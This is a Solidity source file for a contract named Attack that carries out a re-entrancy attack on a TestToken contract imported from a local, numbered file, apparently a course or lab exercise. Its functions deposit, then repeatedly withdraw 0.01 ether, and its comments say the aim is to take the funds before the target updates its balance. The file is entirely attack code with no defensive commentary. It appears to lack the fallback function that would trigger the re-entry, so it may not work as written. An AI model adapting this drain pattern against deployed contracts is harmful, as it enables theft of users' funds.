pragma solidity^0.5.0;
import "/03_ERC20.sol";


contract Attack {


    TestToken public target;


    constructor(address _TargetAddress) public {
        target = TestToken(_TargetAddress);
    }

    // Checking to see if the contract has any balance and we should attack
    function check() external payable {
        if (address(target).balance >= 0.01 ether) {
            target.withdraw(0.01 ether);
        }
    }
    // The re-entrancy attack to take away the funds before the balance can be updated on the other contract
    function attack() external payable {
        require(msg.value >= 0.01 ether);
        target.deposit();
        target.withdraw(0.01 ether);
    }

    // Check the balance of this contract to see if we properly reduced the funds
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}